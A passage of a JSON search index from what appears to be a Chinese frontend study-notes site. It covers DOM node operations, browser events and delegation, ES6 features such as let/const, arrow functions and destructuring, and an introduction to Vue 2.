文本节点\"]},{\"header\":\"nodeName\",\"slug\":\"nodename\",\"contents\":[\"nodeName：获取节点的节点名称\",\"console.log(eleNode.nodeName) // LI console.log(attrNode.nodeName) // test console.log(textNode.nodeName) // #text \",\"元素节点的 nodeName 就是 大写标签名\",\"属性节点的 nodeName 就是 属性名\",\"文本节点的 nodeName 都是 #text\"]},{\"header\":\"nodeValue\",\"slug\":\"nodevalue\",\"contents\":[\"nodeValue： 获取节点的值\",\"console.log(eleNode.nodeValue) // null console.log(attrNode.nodeValue) // 我是 ul 的一个属性 console.log(textNode.nodeValue) // 换行 + 空格 \",\"元素节点没有 nodeValue\",\"属性节点的 nodeValue 就是 属性值\",\"文本节点的 nodeValue 就是 文本内容\"]},{\"header\":\"总结\",\"slug\":\"总结\",\"contents\":[\"nodeType\",\"nodeName\",\"nodeValue\",\"元素节点\",\"1\",\"大写标签名\",\"null\",\"属性节点\",\"2\",\"属性名\",\"属性值\",\"文本节点\",\"3\",\"#text\",\"文本内容\"]},{\"header\":\"操作节点\",\"slug\":\"操作节点\",\"contents\":[\"我们所说的操作无非就是 增删改查（CRUD）\",\"创建一个节点（因为向页面中增加之前，我们需要先创建一个节点出来）\",\"向页面中增加一个节点\",\"删除页面中的某一个节点\",\"修改页面中的某一个节点\",\"获取页面中的某一个节点\"]},{\"header\":\"创建一个节点\",\"slug\":\"创建一个节点\",\"contents\":[\"createElement：用于创建一个元素节点\",\"// 创建一个 div 元素节点 var oDiv = document.createElement('div') console.log(oDiv) // <div></div> \",\"createTextNode：用于创建一个文本节点\",\"// 创建一个文本节点 var oText = document.createTextNode('我是一个文本') console.log(oText) // \\\"我是一个文本\\\" \"]},{\"header\":\"追加一个节点\",\"slug\":\"追加一个节点\",\"contents\":[\"appendChild：是向一个元素节点的末尾追加一个节点\",\"语法： 父节点.appendChild(要插入的子节点)\",\"// 创建一个 div 元素节点 var oDiv = document.createElement('div') var oText = document.createTextNode('我是一个文本') // 向 div 中追加一个文本节点 oDiv.appendChild(oText) console.log(oDiv) // <div>我是一个文本</div> \",\"insertBefore：向某一个节点前插入一个节点\",\"语法： 父节点.insertBefore(要插入的节点，插入在哪一个节点的前面)\",\"<body> <div> <p>我是一个 p 标签</p> </div> <script> var oDiv = document.querySelector('div') var oP = oDiv.querySelector('p') // 创建一个元素节点 var oSpan = document.createElement('span') // 将这个元素节点添加到 div 下的 p 的前面 oDiv.insertBefore(oSpan, oP) console.log(oDiv) /* <div> <span></span> <p>我是一个 p 标签</p> </div> */ </script> </body> \"]},{\"header\":\"删除一个节点\",\"slug\":\"删除一个节点\",\"contents\":[\"removeChild：移除某一节点下的某一个节点\",\"语法：父节点.removeChild(要移除的字节点)\",\"<body> <div> <p>我是一个 p 标签</p> </div> <script> var oDiv = document.querySelector('div') var oP = oDiv.querySelector('p') // 移除 div 下面的 p 标签 oDiv.removeChild(oP) console.log(oDiv) // <div></div> </script> </body> \"]},{\"header\":\"修改一个节点\",\"slug\":\"修改一个节点\",\"contents\":[\"replaceChild：将页面中的某一个节点替换掉\",\"语法： 父节点.replaceChild(新节点，旧节点)\",\"<body> <div> <p>我是一个 p 标签</p> </div> <script> var oDiv = document.querySelector('div') var oP = oDiv.querySelector('p') // 创建一个 span 节点 var oSpan = document.createElement('span') // 向 span 元素中加点文字 oSpan.innerHTML = '我是新创建的 span 标签' // 用创建的 span 标签替换原先 div 下的 p 标签 oDiv.replaceChild(oSpan, oP) console.log(oDiv) /* <div> <span>我是新创建的 span 标签</span> </div> */ </script> </body> \"]},{\"header\":\"克隆一个节点\",\"slug\":\"克隆一个节点\",\"contents\":[\"cloneNode：克隆一个已有的节点\",\"语法：元素.cloneNode(布尔值)\",\"cloneNode 会克隆出一个跟原标签一样的元素，括号内传入布尔值\",\"若为 true，则代表克隆时会包含后代节点一起克隆\",\"若为 false，则代表克隆时不包含后代节点\",\"默认为 false\"]},{\"header\":\"获取元素的偏移量\",\"slug\":\"获取元素的偏移量\",\"contents\":[\"就是元素在页面上相对于参考父级的左边和上边的距离\"]},{\"header\":\"offsetParent\",\"slug\":\"offsetparent\",\"contents\":[\"获取元素的偏移量参考父级\",\"其实就是假设你要给一个元素 绝对定位 的时候，它是根据谁来进行定位的，那么这个元素的偏移量参考父级就是谁\"]},{\"header\":\"offsetLeft 和 offsetTop\",\"slug\":\"offsetleft-和-offsettop\",\"contents\":[\"获取的是元素左边的偏移量和上边的偏移量\",\"offsetLeft ： 该元素相对于参考父级的左侧偏移量\",\"offsetTop ： 该元素相对于参考父级的上侧偏移量\"]},{\"header\":\"获取元素尺寸\",\"slug\":\"获取元素尺寸\",\"contents\":[\"就是获取元素的 \\\"占地面积\\\"\",\"注意:\",\"获取到的尺寸是没有单位的数字\",\"当元素在页面中不占位置的时候， 获取到的是 0 \",\"display: none; 元素在页面不占位\",\"visibility: hidden; 元素在页面占位\"]},{\"header\":\"offsetWith 和 offsetHeight\",\"slug\":\"offsetwith-和-offsetheight\",\"contents\":[\"offsetWidth ： 获取的是元素 内容 + padding + border 的宽度\",\"offsetHeight ： 获取的是元素 内容 + padding + border 的高度\"]},{\"header\":\"clientWidth 和 clientHeight\",\"slug\":\"clientwidth-和-clientheight\",\"contents\":[\"clientWidth ： 获取的是元素 内容 + padding 的宽度\",\"clientHeight ： 获取的是元素 内容 + padding 的高度\"]},{\"header\":\"获取浏览器窗口尺寸\",\"slug\":\"获取浏览器窗口尺寸\",\"contents\":[\"我们之前学过一个 innerWidth 和 innerHeight，它们获取到的是窗口包含滚动条的尺寸，下面我们学习两个不包含滚动条的尺寸获取方式\",\"document.documentElement.clientWidth ： 可视窗口的宽度\",\"document.documentElement.clientHeight ： 可视窗口的高度\"]},{\"header\":\"事件\",\"slug\":\"事件\",\"contents\":[\"事件是编程语言中的术语，它是用来描述程序的行为或状态的，一旦行为或状态发生改变，便立即调用一个函数\",\"一个事件由什么东西组成\",\"触发谁的事件：事件源\",\"触发什么事件：事件类型\",\"触发以后做什么：事件处理函数\",\"var oDiv = document.querySelector('div') oDiv.onclick = function () {} // 谁来触发事件 => oDiv => 这个事件的事件源就是 oDiv // 触发什么事件 => onclick => 这个事件类型就是 click // 触发之后做什么 => function () {} => 这个事件的处理函数 \",\"我们想要在点击 div 以后做什么事情，就把我们要做的事情写在事件处理函数里面\",\"var oDiv = document.querySelector('div') oDiv.onclick = function () { console.log('你点击了 div') } \",\"当我们点击 div 的时候，就会执行事件处理函数内部的代码，每点击一次，就会执行一次事件处理函数\"]},{\"header\":\"事件的绑定方式\",\"slug\":\"事件的绑定方式\",\"contents\":[\"我们现在给一个注册事件都是使用 onxxx 的方式，但是这个方式不是很好，只能给一个元素注册一个事件，一旦写了第二个事件，那么第一个就被覆盖了\",\"oDiv.onclick = function () { console.log('我是第一个事件') } oDiv.onclick = function () { console.log('我是第二个事件') } \",\"当你点击的时候，只会执行第二个，第一个就没有了，我们还有一种事件监听的方式去给元素绑定事件\",\"使用 addEventListener 的方式添加，这个方法不兼容，在 IE 里面要使用 attachEvent\",\"addEventListener : 非 IE7、8 下使用\",\"语法： 元素.addEventListener('事件类型'， 事件处理函数， 冒泡还是捕获)\",\"这里的第三个参数是可选的，后面事件的传播会详述\",\"oDiv.addEventListener('click', function () { console.log('我是第一个事件') }, false) oDiv.addEventListener('click', function () { console.log('我是第二个事件') }, false) \",\"当你点击 div 的时候，两个函数都会执行，并且会按照你注册的顺序执行，先打印 我是第一个事件 再打印 我是第二个事件\",\"注意： 事件类型的时候不要写 on，点击事件就是 click，不是 onclick\",\"attachEvent ：IE 7 8 下使用\",\"语法： 元素.attachEvent('事件类型'， 事件处理函数)\",\"oDiv.attachEvent('onclick', function () { console.log('我是第一个事件') }) oDiv.attachEvent('onclick', function () { console.log('我是第二个事件') }) \",\"当你点击 div 的时候，两个函数都会执行，并且会按照你注册的顺序倒叙执行，先打印 我是第二个事件 再打印 我是第一个事件\",\"注意： 事件类型的时候要写 on，点击事件就写 onclick\",\"两个方式的区别：\",\"注册事件的时候事件类型参数的书写 \",\"addEventListener ： 不用写 on\",\"attachEvent ： 要写 on\",\"参数个数 \",\"addEventListener ： 一般是三个常用参数\",\"attachEvent ： 两个参数\",\"执行顺序 \",\"addEventListener ： 顺序注册，顺序执行\",\"attachEvent ： 顺序注册，倒叙执行\",\"适用浏览器 \",\"addEventListener ： 非 IE7、8 的浏览器\",\"attachEvent ： IE7、8 浏览器\"]},{\"header\":\"常见的事件类型\",\"slug\":\"常见的事件类型\",\"contents\":[\"我们在写页面的时候经常用到的一些事件，大致分为几类，浏览器事件 、 鼠标事件 、 键盘事件 、 表单事件 、 触摸事件、焦点事件等\"]},{\"header\":\"浏览器事件\",\"slug\":\"浏览器事件\",\"contents\":[\"load ： 页面全部资源加载完毕\",\"scroll ： 浏览器滚动的时候触发\",\"...\"]},{\"header\":\"鼠标事件\",\"slug\":\"鼠标事件\",\"contents\":[\"click ：点击事件\",\"dblclick ：双击事件\",\"contextmenu ： 右键单击事件\",\"mousedown ：鼠标左键按下事件\",\"mouseup ：鼠标左键抬起事件\",\"mousemove ：鼠标移动\",\"mouseover ：鼠标移入事件\",\"mouseout ：鼠标移出事件\",\"mouseenter ：鼠标移入事件\",\"mouseleave ：鼠标移出事件\",\"...\"]},{\"header\":\"键盘事件\",\"slug\":\"键盘事件\",\"contents\":[\"keyup ： 键盘抬起事件\",\"keydown ： 键盘按下事件\",\"keypress ： 键盘按下再抬起事件\",\"...\"]},{\"header\":\"表单事件\",\"slug\":\"表单事件\",\"contents\":[\"change : 表单内容改变事件\",\"input : 表单内容输入事件\",\"submit : 表单提交事件\",\"...\"]},{\"header\":\"触摸事件\",\"slug\":\"触摸事件\",\"contents\":[\"touchstart ： 触摸开始事件\",\"touchend ： 触摸结束事件\",\"touchmove ： 触摸移动事件\",\"...\"]},{\"header\":\"焦点事件\",\"slug\":\"焦点事件\",\"contents\":[\"focus：获得焦点事件\",\"blur：失去焦点事件\"]},{\"header\":\"事件对象\",\"slug\":\"事件对象\",\"contents\":[\"什么是事件对象？就是当你触发了一个事件以后，对该事件的一些描述信息\",\"例如：\",\"你触发一个点击事件的时候，你点在哪个位置了，坐标是多少\",\"你触发一个键盘事件的时候，你按的是哪个按钮\",\"...\",\"每一个事件都会有一个对应的对象来描述这些信息，我们就把这个对象叫做 事件对象\",\"浏览器给了我们一个 黑盒子，叫做 window.event，就是对事件信息的所有描述，比如点击事件，你点在了 0，0 位置，那么你得到的这个事件对象里面对应的就会有这个点位的属性，你点在了 10, 10 位置，那么你得到的这个事件对象里面对应的就会有这个点位的属性\",\"oDiv.onclick = function () { console.log(window.event.X轴坐标点信息) console.log(window.event.Y轴坐标点信息) } \",\"这个玩意很好用，但是一般来说，好用的东西就会有 兼容性问题，在 IE低版本 里面这个东西好用，但是在 高版本IE 和 Chrome 里面不好使了，我们就得用另一种方式来获取 事件对象，在每一个事件处理函数的行参位置，默认第一个就是 事件对象\",\"oDiv.onclick = function (e) { // e 就是和 IE 的 window.event 一样的东西 console.log(e.X轴坐标点信息) console.log(e.Y轴坐标点信息) } \",\"综上所述，我们以后在每一个事件里面，想获取事件对象的时候，都用兼容写法\",\"oDiv.onclick = function (e) { e = e || window.event console.log(e.X轴坐标点信息) console.log(e.Y轴坐标点信息) } \",\"常用属性：\",\"type 当前事件的类型\",\"clientX/clientY 光标相对浏览器可见窗口左上角的位置\",\"offsetX/offsetY 光标相于当前 DOM 元素左上角的位置\",\"key 用户按下的键盘键的值，不提倡使用 keycode\"]},{\"header\":\"事件的传播\",\"slug\":\"事件的传播\",\"contents\":[\"DOM02.png\",\"当元素触发一个事件的时候，其父元素也会触发相同的事件，父元素的父元素也会触发相同的事件，就像上面的图片一样，点击在红色盒子上的时候，会触发红色盒子的点击事件，也是点击在了粉色的盒子上，也会触发粉色盒子的点击事件，也是点击在了 body 上，也会触发 body 的点击事件，也是点击在了 html 上，也会触发 html 的点击事件，也是点击在了 document 上，也会触发 document 的点击事件，也是点击在了 window 上，也会触发 window 的点击事件，也就是说，页面上任何一个元素触发事件，都会一层一层最终导致 window 的相同事件触发，前提是各层级元素得有注册相同的事件，不然不会触发\",\"在事件传播的过程中，有一些注意的点：\",\"只会传播同类事件\",\"只会从点击元素开始按照 html 的结构逐层向上元素的事件会被触发\",\"内部元素不管有没有该事件，只要上层元素有该事件，那么上层元素的事件就会被触发\"]},{\"header\":\"冒泡、捕获、目标\",\"slug\":\"冒泡、捕获、目标\",\"contents\":[\"我们刚才聊过了，每一个事件，都是有可能从自己到 window ，有可能要执行多个同类型事件，那么这个执行的顺序就有一些说法了\",\"目标：你是点击在哪个元素身上了，那么这个事件的 目标 就是什么\",\"冒泡：就是从事件 目标 的事件处理函数开始，依次向外，直到 window 的事件处理函数触发，也就是从下向上的执行事件处理函数\",\"捕获：就是从 window 的事件处理函数开始，依次向内，只要事件 目标 的事件处理函数执行，也就是从上向下的执行事件处理函数\",\"冒泡和捕获的区别：就是在事件的传播中，多个同类型事件处理函数的执行顺序不同\",\"addEventListener 第3个参数为 true 表示捕获阶段触发，false 表示冒泡阶段触发，默认值为 false\"]},{\"header\":\"事件委托\",\"slug\":\"事件委托\",\"contents\":[\"事件委托利用了事件传播的特征来解决一些现实开发中的需求\",\"优点：减少注册次数，可以提高程序性能\",\"原理：事件委托其实是利用事件冒泡的特点 \",\"给父元素注册事件，当我们触发子元素的时候，会冒泡到父元素身上，从而触发父元素的事件\",\"实现：事件对象.target.tagName 可以获得真正触发事件的元素\"]},{\"header\":\"事件触发\",\"slug\":\"事件触发\",\"contents\":[\"点击子元素的时候，不管子元素有没有点击事件，只要父元素有点击事件，那么就可以触发父元素的点击事件\",\"<body> <ul> <li>1</li> <li>2</li> <li>3</li> </ul> <script> var oUl = docuemnt.querySelector('ul') oUl.addEventListener('click', function (e) { console.log('我是 ul 的点击事件，我被触发了') }) </script> </body> \",\"像上面一段代码，当你点击 ul 的时候肯定会触发，但是当你点击 li 的时候，其实也会触发\"]},{\"header\":\"target\",\"slug\":\"target\",\"contents\":[\"target 这个属性是事件对象里面的属性，表示你点击的目标，当你触发点击事件的时候，你点击在哪个元素上，target 就是哪个元素，这个 target 也不兼容，在 IE 下要使用 srcElement\",\"<body> <ul> <li>1</li> <li>2</li> <li>3</li> </ul> <script> var oUl = docuemnt.querySelector('ul') oUl.addEventListener('click', function (e) { e = e || window.event var target = e.target || e.srcElement console.log(target) }) </script> </body> \",\"上面的代码，当你点击 ul 的时候，target 就是 ul，当你点击在 li 上面的时候，target 就是 li\"]},{\"header\":\"委托\",\"slug\":\"委托\",\"contents\":[\"这个时候，当我们点击 li 的时候，也可以触发 ul 的点事件，并且在事件内不，我们也可以拿到你点击的到底是 ul 还是 li，这个时候，我们就可以把 li 的事件委托给 ul 来做\",\"<body> <ul> <li>1</li> <li>2</li> <li>3</li> </ul> <script> var oUl = docuemnt.querySelector('ul') oUl.addEventListener('click', function (e) { e = e || window.event var target = e.target || e.srcElement // 判断你点击的是 li if (target.nodeName.toUpperCase === 'LI') { // 确定点击的是 li // 因为当你点击在 ul 上面的时候，nodeName 应该是 'UL' // 去做点击 li 的时候该做的事情了 console.log('我是 li，我被点击了') } }) </script> </body> \",\"上面的代码，我们就可以把 li 要做的事情委托给 ul 来做\"]},{\"header\":\"默认行为\",\"slug\":\"默认行为\",\"contents\":[]},{\"header\":\"什么是默认行为\",\"slug\":\"什么是默认行为\",\"contents\":[\"默认行为，就是不用我们注册，它自己就存在的事情，比如我们点击鼠标右键的时候，会自动弹出一个菜单，比如我们点击 a 标签的时候，我们不需要注册点击事件，他自己就会跳转页面...\",\"这些不需要我们注册就能实现的事情，我们叫做 默认行为\"]},{\"header\":\"阻止默认行为\",\"slug\":\"阻止默认行为\",\"contents\":[\"有的时候，我们不希望浏览器执行默认事件，比如我给 a 标签绑定了一个点击事件，我点击你的时候希望你能告诉我你的地址是什么，而不是直接跳转链接，那么我们就要把 a 标签原先的默认事件阻止，不让他执行默认事件\",\"我们有两个方法来阻止默认事件\",\"e.preventDefault() : 非 IE 使用\",\"e.returnValue = false ：IE 使用\",\"我们阻止默认事件的时候也要写一个兼容的写法\",\"<a href=\\\"https://www.baidu.com\\\">点击我试试</a> <script> var oA = document.querySelector('a') a.addEventListener('click', function (e) { e = e || window.event console.log(this.href) e.preventDefault ? e.preventDefault() : e.returnValue = false }) </script> \",\"这样写完以后，你点击 a 标签的时候，就不会跳转链接了，而是会在控制台打印出 a 标签的 href 属性的值\"]}]},\"/frontend/javascriptnotes/20-ES6.html\":{\"title\":\"ES6\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"ECMAScript 就是 JS 的语法，以前的版本没有某些功能，在 ES5 这个版本的时候增加了一些功能，在 ES6 这个版本的时候又增加了一些功能\",\"因为浏览器是浏览器厂商生产的，ECMAScript 发布了新的功能以后，浏览器厂商需要让自己的浏览器支持这些功能，这个过程是需要时间的，所以到现在，基本上大部分浏览器都可以比较完善的支持了，只不过有些浏览器还是不能全部支持，这就出现了兼容性问题，所以我们写代码的时候就要考虑哪些方法是 ES5 或者 ES6 的，看看是不是浏览器都支持\"]},{\"header\":\"let和const 关键字\",\"slug\":\"let和const-关键字\",\"contents\":[\"我们以前都是使用 var 关键字来声明变量的，在 ES6 的时候，多了两个关键字 let 和 const，也是用来声明变量的\",\"let、const与var的区别：\",\"let 和 const 不允许重复声明变量\",\"// 使用 var 的时候重复声明变量是没问题的，只不过就是后面会把前面覆盖掉 var num = 100 var num = 200 \",\"// 使用 let 重复声明变量的时候就会报错了 let num = 100 let num = 200 // 这里就会报错了 \",\"// 使用 const 重复声明变量的时候就会报错 const num = 100 const num = 200 // 这里就会报错了 \",\"let 和 const 声明的变量不会在预解析的时候解析（也就是没有变量提升）\",\"// 因为预解析（变量提升）的原因，在前面是有这个变量的，只不过没有赋值 console.log(num) // undefined var num = 100 \",\"// 因为 let 不会进行预解析（变量提升），所以直接报错了 console.log(num) // undefined let num = 100 \",\"// 因为 const 不会进行预解析（变量提升），所以直接报错了 console.log(num) // undefined const num = 100 \",\"let 和 const 声明的变量会被所有代码块限制作用范围\",\"// var 声明的变量只有函数能限制其作用域，其他的不能限制 if (true) { var num = 100 } console.log(num) // 100 \",\"// let 声明的变量，除了函数可以限制，所有的代码块都可以限制其作用域（if/while/for/...） if (true) { let num = 100 console.log(num) // 100 } console.log(num) // 报错 \",\"// const 声明的变量，除了函数可以限制，所有的代码块都可以限制其作用域（if/while/for/...） if (true) { const num = 100 console.log(num) // 100 } console.log(num) // 报错 \",\"let 和 const 的区别：\",\"let 声明的变量的值可以改变，const 声明的变量的值不可以改变\",\"let num = 100 num = 200 console.log(num) // 200 \",\"const num = 100 num = 200 // 这里就会报错了，因为 const 声明的变量值不可以改变（我们也叫做常量） \",\"let 声明的时候可以不赋值，const 声明的时候必须赋值，建议使用 const 来声明数组和对象\",\"let num num = 100 console.log(num) // 100 \",\"const num // 这里就会报错了，因为 const 声明的时候必须赋值 \"]},{\"header\":\"展开运算符\",\"slug\":\"展开运算符\",\"contents\":[\"ES6 里面号新添加了一个运算符 ... ，叫做展开运算符\",\"作用：\",\"把数组展开，不会修改原数组\",\"let arr = [1, 2, 3, 4, 5] console.log(...arr) // 1 2 3 4 5 \",\"合并数组的时候可以使用\",\"let arr = [1, 2, 3, 4] let arr2 = [...arr, 5] console.log(arr2) \",\"也可以合并对象使用\",\"let obj = { name: 'Jack', age: 18 } let obj2 = { ...obj, gender: '男' } console.log(obj2) \",\"在函数传递参数的时候也可以使用\",\"let arr = [1, 2, 3] function fn(a, b, c) { console.log(a) console.log(b) console.log(c) } fn(...arr) // 等价于 fn(1, 2, 3) \"]},{\"header\":\"箭头函数\",\"slug\":\"箭头函数\",\"contents\":[\"箭头函数是 ES6 里面一个简写函数的语法方式\",\"重点： 箭头函数只能简写函数表达式，不能简写声明式函数\",\"function fn() {} // 不能简写 const fun = function () {} // 可以简写 const obj = { fn: function () {} // 可以简写 } \",\"语法： (函数的形参) => { 函数体内要执行的代码 }\",\"const fn = function (a, b) { console.log(a) console.log(b) } // 可以使用箭头函数写成 const fun = (a, b) => { console.log(a) console.log(b) } \",\"const obj = { fn: function (a, b) { console.log(a) console.log(b) } } // 可以使用箭头函数写成 const obj2 = { fn: (a, b) => { console.log(a) console.log(b) } } \",\"箭头函数的特殊性：\",\"箭头函数内部没有 this，箭头函数的 this 是上下文的 this\",\"// 在箭头函数定义的位置往上数，这一行是可以打印出 this 的 // 因为这里的 this 是 window // 所以箭头函数内部的 this 就是 window const obj = { fn: function () { console.log(this) }, // 这个位置是箭头函数的上一行，但是不能打印出 this fun: () => { // 箭头函数内部的 this 是书写箭头函数的上一行一个可以打印出 this 的位置 console.log(this) } } obj.fn() obj.fun() // 按照我们之前的 this 指向来判断，两个都应该指向 obj，但是 fun 因为是箭头函数，所以 this 不指向 obj，而是指向 fun 的外层，就是 window \",\"箭头函数内部没有 arguments 这个参数集合，只能使用...\",\"const obj = { fn: function () { console.log(arguments) }, fun: () => { console.log(arguments) } } obj.fn(1, 2, 3) // 会打印一个伪数组 [1, 2, 3] obj.fun(1, 2, 3) // 会直接报错 \",\"函数的形参只有一个的时候可以不写 () 其余情况必须写\",\"const obj = { fn: () => { console.log('没有参数，必须写小括号') }, fn2: a => { console.log('一个形参，可以不写小括号') }, fn3: (a, b) => { console.log('两个或两个以上参数，必须写小括号') } } \",\"函数体只有一行代码的时候，可以不写 {} ，并且会自动 return\",\"const obj = { fn: a => { return a + 10 }, fun: a => a + 10 } console.log(fn(10)) // 20 console.log(fun(10)) // 20 \"]},{\"header\":\"函数传参时的默认值\",\"slug\":\"函数传参时的默认值\",\"contents\":[\"我们在定义函数的时候，有的时候需要一个默认值出现，就是当我不传递参数的时候，使用默认值，传递参数了就使用传递的参数\",\"function fn(a) { a = a || 10 console.log(a) } fn() // 不传递参数的时候，函数内部的 a 就是 10 fn(20) // 传递了参数 20 的时候，函数内部的 a 就是 20 \",\"在 ES6 中我们可以直接把默认值写在函数的形参位置\",\"function fn(a = 10) { console.log(a) } fn() // 不传递参数的时候，函数内部的 a 就是 10 fn(20) // 传递了参数 20 的时候，函数内部的 a 就是 20 \",\"这个默认值的方式箭头函数也可以使用\",\"const fn = (a = 10) => { console.log(a) } fn() // 不传递参数的时候，函数内部的 a 就是 10 fn(20) // 传递了参数 20 的时候，函数内部的 a 就是 20 \",\"注意： 箭头函数如果你需要使用默认值的话，那么一个参数的时候也需要写()\"]},{\"header\":\"解构赋值\",\"slug\":\"解构赋值\",\"contents\":[\"解构赋值，就是快速的从对象或者数组中取出成员的一个语法方式\"]},{\"header\":\"解构对象\",\"slug\":\"解构对象\",\"contents\":[\"快速的从对象中获取成员\",\"// ES5 的方法向得到对象中的成员 const obj = { name: 'Jack', age: 18, gender: '男' } let name = obj.name let age = obj.age let gender = obj.gender \",\"// 解构赋值的方式从对象中获取成员 const obj = { name: 'Jack', age: 18, gender: '男' } // 前面的 {} 表示我要从 obj 这个对象中获取成员了 // name age gender 都得是 obj 中有的成员 // obj 必须是一个对象 let { name, age, gender } = obj \",\"总结：\",\"赋值运算符 = 左侧的 {} 用于批量声明变量，右侧对象的属性值将被赋值给左侧的变量\",\"对象属性的值将被赋值给与属性名相同的变量\",\"对象中找不到与变量名一致的属性时变量值为 undefined\",\"允许初始化变量的默认值，属性不存在或单元值为 undefined 时默认值才会生效\"]},{\"header\":\"解构数组\",\"slug\":\"解构数组\",\"contents\":[\"快速的从数组中获取成员\",\"// ES5 的方式从数组中获取成员 const arr = ['Jack', 'Rose', 'Tom'] let a = arr[0] let b = arr[1] let c = arr[2] \",\"// 使用解构赋值的方式从数组中获取成员 const arr = ['Jack', 'Rose', 'Tom'] // 前面的 [] 表示要从 arr 这个数组中获取成员了 // a b c 分别对应这数组中的索引 0 1 2 // arr 必须是一个数组 let [a, b, c] = arr \",\"总结：\",\"赋值运算符 = 左侧的 [] 用于批量声明变量，右侧数组的单元值将被赋值给左侧的变量\",\"变量的顺序对应数组单元值的位置依次进行赋值操作\",\"变量的数量大于单元值数量时，多余的变量将被赋值为 undefined\",\"变量的数量小于单元值数量时，可以通过 ... 获取剩余单元值，但只能置于最末位\",\"允许初始化变量的默认值，且只有单元值为 undefined 时默认值才会生效\"]},{\"header\":\"模版字符串\",\"slug\":\"模版字符串\",\"contents\":[\"ES5 中我们表示字符串的时候使用 '' 或者 \\\"\\\"，在 ES6 中，我们还有一个东西可以表示字符串，就是`` （反引号）\",\"let str = `hello world` console.log(typeof str) // string \",\"反引号与单引号、双引号的区别：\",\"反引号可以换行书写\",\"// 这个单引号或者双引号不能换行，换行就会报错了 let str = 'hello world' // 下面这个就报错了 let str2 = 'hello world' \",\"let str = ` hello world ` console.log(str) // 是可以使用的 \",\"反引号可以直接在字符串里面拼接变量\",\"// ES5 需要字符串拼接变量的时候 let num = 100 let str = 'hello' + num + 'world' + num console.log(str) // hello100world100 // 直接写在字符串里面不好使 let str2 = 'hellonumworldnum' console.log(str2) // hellonumworldnum \",\"// 模版字符串拼接变量 let num = 100 let str = `hello${num}world${num}` console.log(str) // hello100world100 \",\"里面的 ${} 就是用来书写变量的位置\"]}]},\"/frontend/javascriptnotes/\":{\"title\":\"JavaScript\",\"contents\":[]},\"/frontend/vuenotes/01-Vue%E6%A0%B8%E5%BF%83-%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B.html\":{\"title\":\"Vue核心-快速上手\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"本文示例代码：NoteDemoCode/Vue/01-Vue核心-快速上手\"]},{\"header\":\"Vue 简介\",\"slug\":\"vue-简介\",\"contents\":[]},{\"header\":\"官网\",\"slug\":\"官网\",\"contents\":[\"英文官网\",\"中文官网\"]},{\"header\":\"介绍与描述\",\"slug\":\"介绍与描述\",\"contents\":[\"Vue 是一套用来动态构建用户界面的渐进式 JavaScript 框架 \",\"构建用户界面：把数据通过某种办法变成用户界面\",\"渐进式：Vue 可以自底向上逐层的应用，简单应用只需要一个轻量小巧的核心库，复杂应用可以引入各式各样的 Vue 插件\",\"作者 \",\"尤雨溪\"]},{\"header\":\"Vue 的特点\",\"slug\":\"vue-的特点\",\"contents\":[\"遵循 MVVM 模式\",\"编码简洁，体积小，运行效率高，适合移动/PC 端开发\",\"它本身只关注 UI，可以引入其它第三方库开发项目\",\"采用组件化模式，提高代码复用率、且让代码更好维护\",\"声明式编码，让编码人员无需直接操作 DOM，提高开发效率\",\"使用虚拟 DOM 和 Diff 算法，尽量复用 DOM 节点\"]},{\"header\":\"与其他 JS 框架的关联\",\"slug\":\"与其他-js-框架的关联\",\"contents\":[\"借鉴 angular 的模板和数据绑定技术\",\"借鉴 react 的组件化和虚拟 DOM 技术\"]},{\"header\":\"Vue 周边库\",\"slug\":\"vue-周边库\",\"contents\":[\"vue-cli：vue 脚手架\",\"vue-resource (axios)：ajax 请求\",\"vue-router：路由\",\"vuex：状态管理（它是 vue 的插件，但是没有用 vue-xxx 的命名规则）\",\"vue-lazyload：图片懒加载\",\"vue-scroller：页面滑动相关\",\"mint-ui：基于 vue 的 UI 组件库（移动端）\",\"element-ui：基于 vue 的 UI 组件库（PC 端）\"]},{\"header\":\"初识 Vue\",\"slug\":\"初识-vue\",\"contents\":[]},{\"header\":\"前置工作\",\"slug\":\"前置工作\",\"contents\":[\"给浏览器安装 Vue Devtools 插件\",\"标签引入 Vue 包\",\"（可选）阻止 Vue 在启动时生成生产提示 Vue.config.productionTip = false\"]},{\"header\":\"代码演示\",\"slug\":\"代码演示\",\"contents\":[\"想让 Vue 工作，就必须创建一个 Vue实例，且要传入一个配置对象\",\"容器里的代码依然符合 HTML 规范，只不过混入了一些特殊的 Vue 语法\",\"容器里的代码被称为 Vue 模板\",\"Vue 实例与容器是一一对应的\",\"真实开发中只有一个 Vue 实例，并且会配合着组件一起使用\",\"{{xxx}} 中的 xxx 要写 JS 表达式，且 xxx 可以自动读取到 data 中的所有属性\",\"一旦 data 中的数据发生变化，那么页面中用到该数据的地方也会自动更新\",\"<!DOCTYPE html> <html> <head> <meta charset=\\\"UTF-8\\\" /> <title>初识Vue</title> <!-- 引入Vue --> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <!-- 准备好一个容器 --> <div id=\\\"demo\\\"> <h1>Hello，{{ name.toUpperCase() }}，{{ address }}</h1> </div> <script type=\\\"text/javascript\\\"> Vue.config.productionTip = false //阻止 Vue 在启动时生成生产提示 // 创建Vue实例 new Vue({ el: '#demo', // el用于指定当前Vue实例为哪个容器服务，值通常为CSS选择器字符串 data: { // data中用于存储数据，数据供el所指定的容器去使用，值暂时先写成一个对象 name: 'zhf', address: '山东', }, }) </script> </body> </html> \",\"效果：\",\"Vue核心-快速上手01.png\",\"注意区分：JS 表达式和 JS 代码（语句）\",\"JS 表达式：一个表达式会产生一个值，可以放在任何一个需要值的地方，如：a、a+b、demo(1)、x === y ? 'a' : 'b'\",\"JS 代码（语句），只控制代码的走向，不生成值，如：if (){}、for (){}\"]},{\"header\":\"el 和 data\",\"slug\":\"el-和-data\",\"contents\":[]},{\"header\":\"el\",\"slug\":\"el\",\"contents\":[\"el 用于指定当前 Vue 实例为哪个容器服务，值通常为 CSS 选择器字符串\"]},{\"header\":\"data\",\"slug\":\"data\",\"contents\":[\"data 中用于存储数据，数据供 el 所指定的容器去使用，值暂时先写成一个对象\"]},{\"header\":\"el 和 data 的两种写法\",\"slug\":\"el-和-data-的两种写法\",\"contents\":[\"el 有两种写法：\",\"创建 Vue 实例对象的时候配置 el 属性\",\"const v = new Vue({ el:'#root', //第一种写法 data:{ name:'zhf' } }) \",\"先创建 Vue 实例，随后再通过 